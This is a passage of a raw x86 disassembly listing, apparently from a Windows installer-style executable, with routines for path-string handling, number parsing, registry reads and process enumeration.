  405756:	a1 98 05 47 00       	mov    0x470598,%eax
  40575b:	a3 38 a0 40 00       	mov    %eax,0x40a038
  405760:	8b 44 24 04          	mov    0x4(%esp),%eax
  405764:	68 30 a0 40 00       	push   $0x40a030
  405769:	a3 3c a0 40 00       	mov    %eax,0x40a03c
  40576e:	c7 05 40 a0 40 00 80 	movl   $0x468580,0x40a040
  405775:	85 46 00 
  405778:	89 0d 44 a0 40 00    	mov    %ecx,0x40a044
  40577e:	ff 15 00 82 40 00    	call   *0x408200
  405784:	c2 08 00             	ret    $0x8
  405787:	8b 44 24 04          	mov    0x4(%esp),%eax
  40578b:	eb 0e                	jmp    0x40579b
  40578d:	66 3b 4c 24 08       	cmp    0x8(%esp),%cx
  405792:	74 0f                	je     0x4057a3
  405794:	50                   	push   %eax
  405795:	ff 15 50 82 40 00    	call   *0x408250
  40579b:	0f b7 08             	movzwl (%eax),%ecx
  40579e:	66 85 c9             	test   %cx,%cx
  4057a1:	75 ea                	jne    0x40578d
  4057a3:	c2 08 00             	ret    $0x8
  4057a6:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4057aa:	0f b7 01             	movzwl (%ecx),%eax
  4057ad:	8b d0                	mov    %eax,%edx
  4057af:	83 ca 20             	or     $0x20,%edx
  4057b2:	0f b7 d2             	movzwl %dx,%edx
  4057b5:	66 83 f8 5c          	cmp    $0x5c,%ax
  4057b9:	75 06                	jne    0x4057c1
  4057bb:	66 39 41 02          	cmp    %ax,0x2(%ecx)
  4057bf:	74 10                	je     0x4057d1
  4057c1:	83 c2 9f             	add    $0xffffff9f,%edx
  4057c4:	66 83 fa 19          	cmp    $0x19,%dx
  4057c8:	77 0c                	ja     0x4057d6
  4057ca:	66 83 79 02 3a       	cmpw   $0x3a,0x2(%ecx)
  4057cf:	75 05                	jne    0x4057d6
  4057d1:	33 c0                	xor    %eax,%eax
  4057d3:	40                   	inc    %eax
  4057d4:	eb 02                	jmp    0x4057d8
  4057d6:	33 c0                	xor    %eax,%eax
  4057d8:	c2 04 00             	ret    $0x4
  4057db:	53                   	push   %ebx
  4057dc:	56                   	push   %esi
  4057dd:	8b 35 50 82 40 00    	mov    0x408250,%esi
  4057e3:	57                   	push   %edi
  4057e4:	8b 7c 24 10          	mov    0x10(%esp),%edi
  4057e8:	57                   	push   %edi
  4057e9:	ff d6                	call   *%esi
  4057eb:	8b d8                	mov    %eax,%ebx
  4057ed:	53                   	push   %ebx
  4057ee:	ff d6                	call   *%esi
  4057f0:	0f b7 0f             	movzwl (%edi),%ecx
  4057f3:	66 85 c9             	test   %cx,%cx
  4057f6:	74 12                	je     0x40580a
  4057f8:	66 83 3b 3a          	cmpw   $0x3a,(%ebx)
  4057fc:	75 0c                	jne    0x40580a
  4057fe:	66 83 7b 02 5c       	cmpw   $0x5c,0x2(%ebx)
  405803:	75 05                	jne    0x40580a
  405805:	50                   	push   %eax
  405806:	ff d6                	call   *%esi
  405808:	eb 28                	jmp    0x405832
  40580a:	66 83 f9 5c          	cmp    $0x5c,%cx
  40580e:	75 20                	jne    0x405830
  405810:	66 39 4f 02          	cmp    %cx,0x2(%edi)
  405814:	75 1a                	jne    0x405830
  405816:	6a 02                	push   $0x2
  405818:	5e                   	pop    %esi
  405819:	6a 5c                	push   $0x5c
  40581b:	50                   	push   %eax
  40581c:	4e                   	dec    %esi
  40581d:	e8 65 ff ff ff       	call   0x405787
  405822:	66 83 38 00          	cmpw   $0x0,(%eax)
  405826:	74 08                	je     0x405830
  405828:	40                   	inc    %eax
  405829:	40                   	inc    %eax
  40582a:	85 f6                	test   %esi,%esi
  40582c:	75 eb                	jne    0x405819
  40582e:	eb 02                	jmp    0x405832
  405830:	33 c0                	xor    %eax,%eax
  405832:	5f                   	pop    %edi
  405833:	5e                   	pop    %esi
  405834:	5b                   	pop    %ebx
  405835:	c2 04 00             	ret    $0x4
  405838:	55                   	push   %ebp
  405839:	8b ec                	mov    %esp,%ebp
  40583b:	51                   	push   %ecx
  40583c:	53                   	push   %ebx
  40583d:	56                   	push   %esi
  40583e:	57                   	push   %edi
  40583f:	ff 75 0c             	push   0xc(%ebp)
  405842:	8b 3d 4c 81 40 00    	mov    0x40814c,%edi
  405848:	ff d7                	call   *%edi
  40584a:	8b 75 08             	mov    0x8(%ebp),%esi
  40584d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405850:	eb 27                	jmp    0x405879
  405852:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405855:	ff 75 0c             	push   0xc(%ebp)
  405858:	8a 1c 30             	mov    (%eax,%esi,1),%bl
  40585b:	56                   	push   %esi
  40585c:	c6 04 30 00          	movb   $0x0,(%eax,%esi,1)
  405860:	ff 15 dc 80 40 00    	call   *0x4080dc
  405866:	85 c0                	test   %eax,%eax
  405868:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40586b:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  40586e:	74 1a                	je     0x40588a
  405870:	56                   	push   %esi
  405871:	ff 15 04 82 40 00    	call   *0x408204
  405877:	8b f0                	mov    %eax,%esi
  405879:	56                   	push   %esi
  40587a:	ff d7                	call   *%edi
  40587c:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  40587f:	7d d1                	jge    0x405852
  405881:	33 c0                	xor    %eax,%eax
  405883:	5f                   	pop    %edi
  405884:	5e                   	pop    %esi
  405885:	5b                   	pop    %ebx
  405886:	c9                   	leave
  405887:	c2 08 00             	ret    $0x8
  40588a:	8b c6                	mov    %esi,%eax
  40588c:	eb f5                	jmp    0x405883
  40588e:	55                   	push   %ebp
  40588f:	8b ec                	mov    %esp,%ebp
  405891:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  405895:	8b 45 08             	mov    0x8(%ebp),%eax
  405898:	7e 14                	jle    0x4058ae
  40589a:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40589d:	2b c8                	sub    %eax,%ecx
  40589f:	8a 14 01             	mov    (%ecx,%eax,1),%dl
  4058a2:	ff 4d 10             	decl   0x10(%ebp)
  4058a5:	88 10                	mov    %dl,(%eax)
  4058a7:	40                   	inc    %eax
  4058a8:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  4058ac:	7f f1                	jg     0x40589f
  4058ae:	5d                   	pop    %ebp
  4058af:	c2 0c 00             	ret    $0xc
  4058b2:	ff 74 24 04          	push   0x4(%esp)
  4058b6:	ff 15 7c 80 40 00    	call   *0x40807c
  4058bc:	83 f8 ff             	cmp    $0xffffffff,%eax
  4058bf:	74 0e                	je     0x4058cf
  4058c1:	83 e0 fe             	and    $0xfffffffe,%eax
  4058c4:	50                   	push   %eax
  4058c5:	ff 74 24 08          	push   0x8(%esp)
  4058c9:	ff 15 88 80 40 00    	call   *0x408088
  4058cf:	c2 04 00             	ret    $0x4
  4058d2:	ff 74 24 04          	push   0x4(%esp)
  4058d6:	ff 15 7c 80 40 00    	call   *0x40807c
  4058dc:	8b c8                	mov    %eax,%ecx
  4058de:	41                   	inc    %ecx
  4058df:	6a 00                	push   $0x0
  4058e1:	f7 d9                	neg    %ecx
  4058e3:	1b c9                	sbb    %ecx,%ecx
  4058e5:	23 c8                	and    %eax,%ecx
  4058e7:	51                   	push   %ecx
  4058e8:	ff 74 24 14          	push   0x14(%esp)
  4058ec:	6a 00                	push   $0x0
  4058ee:	6a 01                	push   $0x1
  4058f0:	ff 74 24 1c          	push   0x1c(%esp)
  4058f4:	ff 74 24 1c          	push   0x1c(%esp)
  4058f8:	ff 15 e0 80 40 00    	call   *0x4080e0
  4058fe:	c2 0c 00             	ret    $0xc
  405901:	55                   	push   %ebp
  405902:	8b ec                	mov    %esp,%ebp
  405904:	51                   	push   %ecx
  405905:	51                   	push   %ecx
  405906:	56                   	push   %esi
  405907:	8b 75 08             	mov    0x8(%ebp),%esi
  40590a:	57                   	push   %edi
  40590b:	6a 64                	push   $0x64
  40590d:	5f                   	pop    %edi
  40590e:	a1 c4 88 40 00       	mov    0x4088c4,%eax
  405913:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405916:	a1 c8 88 40 00       	mov    0x4088c8,%eax
  40591b:	4f                   	dec    %edi
  40591c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40591f:	ff 15 90 80 40 00    	call   *0x408090
  405925:	6a 1a                	push   $0x1a
  405927:	59                   	pop    %ecx
  405928:	33 d2                	xor    %edx,%edx
  40592a:	f7 f1                	div    %ecx
  40592c:	56                   	push   %esi
  40592d:	6a 00                	push   $0x0
  40592f:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405932:	50                   	push   %eax
  405933:	ff 75 0c             	push   0xc(%ebp)
  405936:	66 01 55 fc          	add    %dx,-0x4(%ebp)
  40593a:	ff 15 e4 80 40 00    	call   *0x4080e4
  405940:	85 c0                	test   %eax,%eax
  405942:	75 0d                	jne    0x405951
  405944:	85 ff                	test   %edi,%edi
  405946:	75 c6                	jne    0x40590e
  405948:	66 89 06             	mov    %ax,(%esi)
  40594b:	5f                   	pop    %edi
  40594c:	5e                   	pop    %esi
  40594d:	c9                   	leave
  40594e:	c2 08 00             	ret    $0x8
  405951:	8b c6                	mov    %esi,%eax
  405953:	eb f6                	jmp    0x40594b
  405955:	55                   	push   %ebp
  405956:	8b ec                	mov    %esp,%ebp
  405958:	56                   	push   %esi
  405959:	8b 75 14             	mov    0x14(%ebp),%esi
  40595c:	33 c0                	xor    %eax,%eax
  40595e:	66 89 06             	mov    %ax,(%esi)
  405961:	8d 45 18             	lea    0x18(%ebp),%eax
  405964:	50                   	push   %eax
  405965:	8b 45 18             	mov    0x18(%ebp),%eax
  405968:	f7 d8                	neg    %eax
  40596a:	1b c0                	sbb    %eax,%eax
  40596c:	25 00 01 00 00       	and    $0x100,%eax
  405971:	0d 19 00 02 00       	or     $0x20019,%eax
  405976:	50                   	push   %eax
  405977:	6a 00                	push   $0x0
  405979:	ff 75 0c             	push   0xc(%ebp)
  40597c:	ff 75 08             	push   0x8(%ebp)
  40597f:	ff 15 04 80 40 00    	call   *0x408004
  405985:	85 c0                	test   %eax,%eax
  405987:	75 45                	jne    0x4059ce
  405989:	8d 45 0c             	lea    0xc(%ebp),%eax
  40598c:	50                   	push   %eax
  40598d:	56                   	push   %esi
  40598e:	8d 45 14             	lea    0x14(%ebp),%eax
  405991:	50                   	push   %eax
  405992:	6a 00                	push   $0x0
  405994:	ff 75 10             	push   0x10(%ebp)
  405997:	c7 45 0c 08 40 00 00 	movl   $0x4008,0xc(%ebp)
  40599e:	ff 75 18             	push   0x18(%ebp)
  4059a1:	ff 15 1c 80 40 00    	call   *0x40801c
  4059a7:	85 c0                	test   %eax,%eax
  4059a9:	75 0c                	jne    0x4059b7
  4059ab:	83 7d 14 01          	cmpl   $0x1,0x14(%ebp)
  4059af:	74 0b                	je     0x4059bc
  4059b1:	83 7d 14 02          	cmpl   $0x2,0x14(%ebp)
  4059b5:	74 05                	je     0x4059bc
  4059b7:	33 c0                	xor    %eax,%eax
  4059b9:	66 89 06             	mov    %ax,(%esi)
  4059bc:	ff 75 18             	push   0x18(%ebp)
  4059bf:	33 c0                	xor    %eax,%eax
  4059c1:	66 89 86 06 40 00 00 	mov    %ax,0x4006(%esi)
  4059c8:	ff 15 08 80 40 00    	call   *0x408008
  4059ce:	5e                   	pop    %esi
  4059cf:	5d                   	pop    %ebp
  4059d0:	c2 14 00             	ret    $0x14
  4059d3:	ff 74 24 08          	push   0x8(%esp)
  4059d7:	68 0c 88 40 00       	push   $0x40880c
  4059dc:	ff 74 24 0c          	push   0xc(%esp)
  4059e0:	ff 15 38 82 40 00    	call   *0x408238
  4059e6:	83 c4 0c             	add    $0xc,%esp
  4059e9:	c2 08 00             	ret    $0x8
  4059ec:	55                   	push   %ebp
  4059ed:	8b ec                	mov    %esp,%ebp
  4059ef:	51                   	push   %ecx
  4059f0:	51                   	push   %ecx
  4059f1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4059f4:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4059f8:	66 83 39 2d          	cmpw   $0x2d,(%ecx)
  4059fc:	53                   	push   %ebx
  4059fd:	56                   	push   %esi
  4059fe:	6a 0a                	push   $0xa
  405a00:	58                   	pop    %eax
  405a01:	6a 39                	push   $0x39
  405a03:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  405a0a:	5b                   	pop    %ebx
  405a0b:	75 06                	jne    0x405a13
  405a0d:	41                   	inc    %ecx
  405a0e:	41                   	inc    %ecx
  405a0f:	83 4d f8 ff          	orl    $0xffffffff,-0x8(%ebp)
  405a13:	66 83 39 30          	cmpw   $0x30,(%ecx)
  405a17:	75 27                	jne    0x405a40
  405a19:	41                   	inc    %ecx
  405a1a:	41                   	inc    %ecx
  405a1b:	0f b7 11             	movzwl (%ecx),%edx
  405a1e:	66 83 fa 30          	cmp    $0x30,%dx
  405a22:	72 0c                	jb     0x405a30
  405a24:	66 83 fa 37          	cmp    $0x37,%dx
  405a28:	77 06                	ja     0x405a30
  405a2a:	6a 08                	push   $0x8
  405a2c:	58                   	pop    %eax
  405a2d:	6a 37                	push   $0x37
  405a2f:	5b                   	pop    %ebx
  405a30:	0f b7 d2             	movzwl %dx,%edx
  405a33:	83 e2 df             	and    $0xffffffdf,%edx
  405a36:	83 fa 58             	cmp    $0x58,%edx
  405a39:	75 05                	jne    0x405a40
  405a3b:	6a 10                	push   $0x10
  405a3d:	41                   	inc    %ecx
  405a3e:	58                   	pop    %eax
  405a3f:	41                   	inc    %ecx
  405a40:	0f b7 11             	movzwl (%ecx),%edx
  405a43:	41                   	inc    %ecx
  405a44:	41                   	inc    %ecx
  405a45:	83 fa 30             	cmp    $0x30,%edx
  405a48:	7c 0c                	jl     0x405a56
  405a4a:	0f b7 f3             	movzwl %bx,%esi
  405a4d:	3b d6                	cmp    %esi,%edx
  405a4f:	7f 05                	jg     0x405a56
  405a51:	83 ea 30             	sub    $0x30,%edx
  405a54:	eb 1b                	jmp    0x405a71
  405a56:	66 83 f8 10          	cmp    $0x10,%ax
  405a5a:	75 23                	jne    0x405a7f
  405a5c:	8b f2                	mov    %edx,%esi
  405a5e:	83 e6 df             	and    $0xffffffdf,%esi
  405a61:	83 fe 41             	cmp    $0x41,%esi
  405a64:	7c 19                	jl     0x405a7f
  405a66:	83 fe 46             	cmp    $0x46,%esi
  405a69:	7f 14                	jg     0x405a7f
  405a6b:	83 e2 07             	and    $0x7,%edx
  405a6e:	83 c2 09             	add    $0x9,%edx
  405a71:	0f b7 f0             	movzwl %ax,%esi
  405a74:	0f af 75 fc          	imul   -0x4(%ebp),%esi
  405a78:	03 f2                	add    %edx,%esi
  405a7a:	89 75 fc             	mov    %esi,-0x4(%ebp)
  405a7d:	eb c1                	jmp    0x405a40
  405a7f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405a82:	0f af 45 fc          	imul   -0x4(%ebp),%eax
  405a86:	5e                   	pop    %esi
  405a87:	5b                   	pop    %ebx
  405a88:	c9                   	leave
  405a89:	c2 04 00             	ret    $0x4
  405a8c:	68 04 20 00 00       	push   $0x2004
  405a91:	ff 74 24 0c          	push   0xc(%esp)
  405a95:	ff 74 24 0c          	push   0xc(%esp)
  405a99:	ff 15 c0 80 40 00    	call   *0x4080c0
  405a9f:	c2 08 00             	ret    $0x8
  405aa2:	ff 25 70 81 40 00    	jmp    *0x408170
  405aa8:	ff 25 e8 80 40 00    	jmp    *0x4080e8
  405aae:	0f b7 44 24 04       	movzwl 0x4(%esp),%eax
  405ab3:	50                   	push   %eax
  405ab4:	ff 15 08 82 40 00    	call   *0x408208
  405aba:	c3                   	ret
  405abb:	55                   	push   %ebp
  405abc:	56                   	push   %esi
  405abd:	8b 74 24 0c          	mov    0xc(%esp),%esi
  405ac1:	66 83 3e 5c          	cmpw   $0x5c,(%esi)
  405ac5:	57                   	push   %edi
  405ac6:	75 18                	jne    0x405ae0
  405ac8:	66 83 7e 02 5c       	cmpw   $0x5c,0x2(%esi)
  405acd:	75 11                	jne    0x405ae0
  405acf:	66 83 7e 04 3f       	cmpw   $0x3f,0x4(%esi)
  405ad4:	75 0a                	jne    0x405ae0
  405ad6:	66 83 7e 06 5c       	cmpw   $0x5c,0x6(%esi)
  405adb:	75 03                	jne    0x405ae0
  405add:	83 c6 08             	add    $0x8,%esi
  405ae0:	66 83 3e 00          	cmpw   $0x0,(%esi)
  405ae4:	74 0d                	je     0x405af3
  405ae6:	56                   	push   %esi
  405ae7:	e8 ba fc ff ff       	call   0x4057a6
  405aec:	85 c0                	test   %eax,%eax
  405aee:	74 03                	je     0x405af3
  405af0:	83 c6 04             	add    $0x4,%esi
  405af3:	0f b7 06             	movzwl (%esi),%eax
  405af6:	8b ee                	mov    %esi,%ebp
  405af8:	8b fe                	mov    %esi,%edi
  405afa:	66 85 c0             	test   %ax,%ax
  405afd:	74 40                	je     0x405b3f
  405aff:	53                   	push   %ebx
  405b00:	8b 1d 50 82 40 00    	mov    0x408250,%ebx
  405b06:	66 83 f8 1f          	cmp    $0x1f,%ax
  405b0a:	76 25                	jbe    0x405b31
  405b0c:	50                   	push   %eax
  405b0d:	68 cc 88 40 00       	push   $0x4088cc
  405b12:	e8 70 fc ff ff       	call   0x405787
  405b17:	66 83 38 00          	cmpw   $0x0,(%eax)
  405b1b:	75 14                	jne    0x405b31
  405b1d:	56                   	push   %esi
  405b1e:	ff d3                	call   *%ebx
  405b20:	2b c6                	sub    %esi,%eax
  405b22:	d1 f8                	sar    $1,%eax
  405b24:	50                   	push   %eax
  405b25:	56                   	push   %esi
  405b26:	57                   	push   %edi
  405b27:	e8 62 fd ff ff       	call   0x40588e
  405b2c:	57                   	push   %edi
  405b2d:	ff d3                	call   *%ebx
  405b2f:	8b f8                	mov    %eax,%edi
  405b31:	56                   	push   %esi
  405b32:	ff d3                	call   *%ebx
  405b34:	8b f0                	mov    %eax,%esi
  405b36:	0f b7 06             	movzwl (%esi),%eax
  405b39:	66 85 c0             	test   %ax,%ax
  405b3c:	75 c8                	jne    0x405b06
  405b3e:	5b                   	pop    %ebx
  405b3f:	33 c0                	xor    %eax,%eax
  405b41:	66 89 07             	mov    %ax,(%edi)
  405b44:	57                   	push   %edi
  405b45:	55                   	push   %ebp
  405b46:	ff 15 0c 82 40 00    	call   *0x40820c
  405b4c:	8b f8                	mov    %eax,%edi
  405b4e:	0f b7 07             	movzwl (%edi),%eax
  405b51:	66 83 f8 20          	cmp    $0x20,%ax
  405b55:	74 06                	je     0x405b5d
  405b57:	66 83 f8 5c          	cmp    $0x5c,%ax
  405b5b:	75 09                	jne    0x405b66
  405b5d:	33 c0                	xor    %eax,%eax
  405b5f:	66 89 07             	mov    %ax,(%edi)
  405b62:	3b ef                	cmp    %edi,%ebp
  405b64:	72 de                	jb     0x405b44
  405b66:	5f                   	pop    %edi
  405b67:	5e                   	pop    %esi
  405b68:	5d                   	pop    %ebp
  405b69:	c2 04 00             	ret    $0x4
  405b6c:	56                   	push   %esi
  405b6d:	be a8 ae 45 00       	mov    $0x45aea8,%esi
  405b72:	56                   	push   %esi
  405b73:	ff 74 24 0c          	push   0xc(%esp)
  405b77:	ff 15 68 81 40 00    	call   *0x408168
  405b7d:	83 f8 ff             	cmp    $0xffffffff,%eax
  405b80:	74 0b                	je     0x405b8d
  405b82:	50                   	push   %eax
  405b83:	ff 15 60 81 40 00    	call   *0x408160
  405b89:	8b c6                	mov    %esi,%eax
  405b8b:	eb 02                	jmp    0x405b8f
  405b8d:	33 c0                	xor    %eax,%eax
  405b8f:	5e                   	pop    %esi
  405b90:	c2 04 00             	ret    $0x4
  405b93:	56                   	push   %esi
  405b94:	8b 74 24 08          	mov    0x8(%esp),%esi
  405b98:	57                   	push   %edi
  405b99:	c1 e6 03             	shl    $0x3,%esi
  405b9c:	8b be 58 a0 40 00    	mov    0x40a058(%esi),%edi
  405ba2:	57                   	push   %edi
  405ba3:	ff 15 f4 80 40 00    	call   *0x4080f4
  405ba9:	85 c0                	test   %eax,%eax
  405bab:	75 0b                	jne    0x405bb8
  405bad:	57                   	push   %edi
  405bae:	ff 15 f0 80 40 00    	call   *0x4080f0
  405bb4:	85 c0                	test   %eax,%eax
  405bb6:	74 0d                	je     0x405bc5
  405bb8:	ff b6 5c a0 40 00    	push   0x40a05c(%esi)
  405bbe:	50                   	push   %eax
  405bbf:	ff 15 ec 80 40 00    	call   *0x4080ec
  405bc5:	5f                   	pop    %edi
  405bc6:	5e                   	pop    %esi
  405bc7:	c2 04 00             	ret    $0x4
  405bca:	55                   	push   %ebp
  405bcb:	8b ec                	mov    %esp,%ebp
  405bcd:	83 ec 1c             	sub    $0x1c,%esp
  405bd0:	56                   	push   %esi
  405bd1:	8b 75 08             	mov    0x8(%ebp),%esi
  405bd4:	57                   	push   %edi
  405bd5:	8b 3d 14 82 40 00    	mov    0x408214,%edi
  405bdb:	eb 0a                	jmp    0x405be7
  405bdd:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  405be0:	50                   	push   %eax
  405be1:	ff 15 10 82 40 00    	call   *0x408210
  405be7:	6a 01                	push   $0x1
  405be9:	56                   	push   %esi
  405bea:	56                   	push   %esi
  405beb:	6a 00                	push   $0x0
  405bed:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  405bf0:	50                   	push   %eax
  405bf1:	ff d7                	call   *%edi
  405bf3:	85 c0                	test   %eax,%eax
  405bf5:	75 e6                	jne    0x405bdd
  405bf7:	5f                   	pop    %edi
  405bf8:	5e                   	pop    %esi
  405bf9:	c9                   	leave
  405bfa:	c2 04 00             	ret    $0x4
  405bfd:	53                   	push   %ebx
  405bfe:	56                   	push   %esi
  405bff:	57                   	push   %edi
  405c00:	be 04 20 00 00       	mov    $0x2004,%esi
  405c05:	56                   	push   %esi
  405c06:	6a 40                	push   $0x40
  405c08:	ff 15 20 81 40 00    	call   *0x408120
  405c0e:	33 ff                	xor    %edi,%edi
  405c10:	57                   	push   %edi
  405c11:	57                   	push   %edi
  405c12:	56                   	push   %esi
  405c13:	8b d8                	mov    %eax,%ebx
  405c15:	53                   	push   %ebx
  405c16:	6a ff                	push   $0xffffffff
  405c18:	ff 74 24 28          	push   0x28(%esp)
  405c1c:	57                   	push   %edi
  405c1d:	57                   	push   %edi
  405c1e:	ff 15 44 81 40 00    	call   *0x408144
  405c24:	85 c0                	test   %eax,%eax
  405c26:	74 0d                	je     0x405c35
  405c28:	53                   	push   %ebx
  405c29:	ff 74 24 14          	push   0x14(%esp)
  405c2d:	ff 15 ec 80 40 00    	call   *0x4080ec
  405c33:	8b f8                	mov    %eax,%edi
  405c35:	53                   	push   %ebx
  405c36:	ff 15 2c 81 40 00    	call   *0x40812c
  405c3c:	8b c7                	mov    %edi,%eax
  405c3e:	5f                   	pop    %edi
  405c3f:	5e                   	pop    %esi
  405c40:	5b                   	pop    %ebx
  405c41:	c2 08 00             	ret    $0x8
  405c44:	55                   	push   %ebp
  405c45:	8b ec                	mov    %esp,%ebp
  405c47:	81 ec 98 0b 00 00    	sub    $0xb98,%esp
  405c4d:	53                   	push   %ebx
  405c4e:	56                   	push   %esi
  405c4f:	57                   	push   %edi
  405c50:	68 a0 0f 00 00       	push   $0xfa0
  405c55:	6a 40                	push   $0x40
  405c57:	ff 15 20 81 40 00    	call   *0x408120
  405c5d:	8b 5d 08             	mov    0x8(%ebp),%ebx
  405c60:	53                   	push   %ebx
  405c61:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405c64:	ff 15 70 81 40 00    	call   *0x408170
  405c6a:	8b f8                	mov    %eax,%edi
  405c6c:	8d 47 ff             	lea    -0x1(%edi),%eax
  405c6f:	3d 03 01 00 00       	cmp    $0x103,%eax
  405c74:	0f 87 34 03 00 00    	ja     0x405fae
  405c7a:	33 f6                	xor    %esi,%esi
  405c7c:	85 ff                	test   %edi,%edi
  405c7e:	7e 27                	jle    0x405ca7
  405c80:	8d 85 c4 fc ff ff    	lea    -0x33c(%ebp),%eax
  405c86:	2b d8                	sub    %eax,%ebx
  405c88:	8d 04 73             	lea    (%ebx,%esi,2),%eax
  405c8b:	0f b7 84 05 c4 fc ff 	movzwl -0x33c(%ebp,%eax,1),%eax
  405c92:	ff 
  405c93:	50                   	push   %eax
  405c94:	e8 15 fe ff ff       	call   0x405aae
  405c99:	66 89 84 75 c4 fc ff 	mov    %ax,-0x33c(%ebp,%esi,2)
  405ca0:	ff 
  405ca1:	46                   	inc    %esi
  405ca2:	3b f7                	cmp    %edi,%esi
  405ca4:	59                   	pop    %ecx
  405ca5:	7c e1                	jl     0x405c88
  405ca7:	33 c0                	xor    %eax,%eax
  405ca9:	66 89 84 7d c4 fc ff 	mov    %ax,-0x33c(%ebp,%edi,2)
  405cb0:	ff 
  405cb1:	8d 85 cc fe ff ff    	lea    -0x134(%ebp),%eax
  405cb7:	50                   	push   %eax
  405cb8:	c7 85 cc fe ff ff 14 	movl   $0x114,-0x134(%ebp)
  405cbf:	01 00 00 
  405cc2:	ff 15 00 81 40 00    	call   *0x408100
  405cc8:	85 c0                	test   %eax,%eax
  405cca:	75 0a                	jne    0x405cd6
  405ccc:	b8 5e 02 00 00       	mov    $0x25e,%eax
  405cd1:	e9 dd 02 00 00       	jmp    0x405fb3
  405cd6:	83 bd dc fe ff ff 02 	cmpl   $0x2,-0x124(%ebp)
  405cdd:	8b 35 ec 80 40 00    	mov    0x4080ec,%esi
  405ce3:	74 17                	je     0x405cfc
  405ce5:	83 bd dc fe ff ff 01 	cmpl   $0x1,-0x124(%ebp)
  405cec:	0f 84 2b 01 00 00    	je     0x405e1d
  405cf2:	b8 5f 02 00 00       	mov    $0x25f,%eax
  405cf7:	e9 b7 02 00 00       	jmp    0x405fb3
  405cfc:	68 94 89 40 00       	push   $0x408994
  405d01:	ff 15 f0 80 40 00    	call   *0x4080f0
  405d07:	8b d8                	mov    %eax,%ebx
  405d09:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  405d0c:	85 db                	test   %ebx,%ebx
  405d0e:	75 0a                	jne    0x405d1a
  405d10:	b8 5d 02 00 00       	mov    $0x25d,%eax
  405d15:	e9 99 02 00 00       	jmp    0x405fb3
  405d1a:	68 84 89 40 00       	push   $0x408984
  405d1f:	53                   	push   %ebx
  405d20:	ff d6                	call   *%esi
  405d22:	68 70 89 40 00       	push   $0x408970
  405d27:	53                   	push   %ebx
  405d28:	8b f8                	mov    %eax,%edi
  405d2a:	ff d6                	call   *%esi
  405d2c:	68 5c 89 40 00       	push   $0x40895c
  405d31:	53                   	push   %ebx
  405d32:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405d35:	ff d6                	call   *%esi
  405d37:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405d3a:	85 ff                	test   %edi,%edi
  405d3c:	0f 84 a6 01 00 00    	je     0x405ee8
  405d42:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  405d46:	0f 84 9c 01 00 00    	je     0x405ee8
  405d4c:	85 c0                	test   %eax,%eax
  405d4e:	0f 84 94 01 00 00    	je     0x405ee8
  405d54:	8d 45 ec             	lea    -0x14(%ebp),%eax
  405d57:	50                   	push   %eax
  405d58:	68 e8 03 00 00       	push   $0x3e8
  405d5d:	ff 75 fc             	push   -0x4(%ebp)
  405d60:	ff d7                	call   *%edi
  405d62:	85 c0                	test   %eax,%eax
  405d64:	75 1c                	jne    0x405d82
  405d66:	be 5d 02 00 00       	mov    $0x25d,%esi
  405d6b:	53                   	push   %ebx
  405d6c:	ff 15 38 81 40 00    	call   *0x408138
  405d72:	ff 75 fc             	push   -0x4(%ebp)
  405d75:	ff 15 2c 81 40 00    	call   *0x40812c
  405d7b:	8b c6                	mov    %esi,%eax
  405d7d:	e9 31 02 00 00       	jmp    0x405fb3
  405d82:	8b 5d ec             	mov    -0x14(%ebp),%ebx
  405d85:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  405d89:	c1 eb 02             	shr    $0x2,%ebx
  405d8c:	85 db                	test   %ebx,%ebx
  405d8e:	0f 86 89 00 00 00    	jbe    0x405e1d
  405d94:	68 4c 89 40 00       	push   $0x40894c
  405d99:	8d 85 90 f8 ff ff    	lea    -0x770(%ebp),%eax
  405d9f:	50                   	push   %eax
  405da0:	ff 15 fc 80 40 00    	call   *0x4080fc
  405da6:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405da9:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405dac:	ff 34 88             	push   (%eax,%ecx,4)
  405daf:	6a 00                	push   $0x0
  405db1:	68 10 04 00 00       	push   $0x410
  405db6:	ff 15 f8 80 40 00    	call   *0x4080f8
  405dbc:	8b f8                	mov    %eax,%edi
  405dbe:	85 ff                	test   %edi,%edi
  405dc0:	74 25                	je     0x405de7
  405dc2:	8d 45 ec             	lea    -0x14(%ebp),%eax
  405dc5:	50                   	push   %eax
  405dc6:	6a 04                	push   $0x4
  405dc8:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  405dcb:	50                   	push   %eax
  405dcc:	57                   	push   %edi
  405dcd:	ff 55 f8             	call   *-0x8(%ebp)
  405dd0:	85 c0                	test   %eax,%eax
  405dd2:	74 13                	je     0x405de7
  405dd4:	68 04 01 00 00       	push   $0x104
  405dd9:	8d 85 90 f8 ff ff    	lea    -0x770(%ebp),%eax
  405ddf:	50                   	push   %eax
  405de0:	ff 75 e4             	push   -0x1c(%ebp)
  405de3:	57                   	push   %edi
  405de4:	ff 55 f4             	call   *-0xc(%ebp)
  405de7:	57                   	push   %edi
  405de8:	ff 15 bc 80 40 00    	call   *0x4080bc
  405dee:	8d 85 90 f8 ff ff    	lea    -0x770(%ebp),%eax
  405df4:	50                   	push   %eax
  405df5:	ff 15 08 82 40 00    	call   *0x408208
